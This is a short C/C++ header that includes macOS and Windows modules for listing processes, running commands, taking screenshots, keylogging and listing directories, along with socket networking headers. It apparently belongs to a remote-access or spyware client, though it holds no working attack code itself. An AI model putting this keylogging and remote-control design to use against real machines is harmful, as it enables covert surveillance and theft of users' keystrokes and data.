#pragma once
#ifdef __APPLE__
    #include "function_unix/ListProcesses.h"
    #include "function_unix/AppCMD.h"
    #include "function_unix/Screenshot.h"
    #include "function_unix/Keylog.h"
    #include "function_unix/ListDirTree.h"

    #include <sys/types.h> 
    #include <sys/socket.h> 
    #include <arpa/inet.h> 
    #include <poll.h>
    #include <netdb.h>
    #include <unistd.h> 
    #include <netinet/in.h>
    #include <signal.h>
#elif _WIN32
    #include <windows.h>
    #include <winsock2.h>
    #include <ws2tcpip.h>

    #include "function_window/ListProcesses.h"
    #include "function_window/AppCMD.h"
    #include "function_window/Screenshot.h"
    #include "function_window/Keylog.h"
    #include "function_window/ListDirTree.h"
    
    #define close closesocket
    #define poll WSAPoll
#endif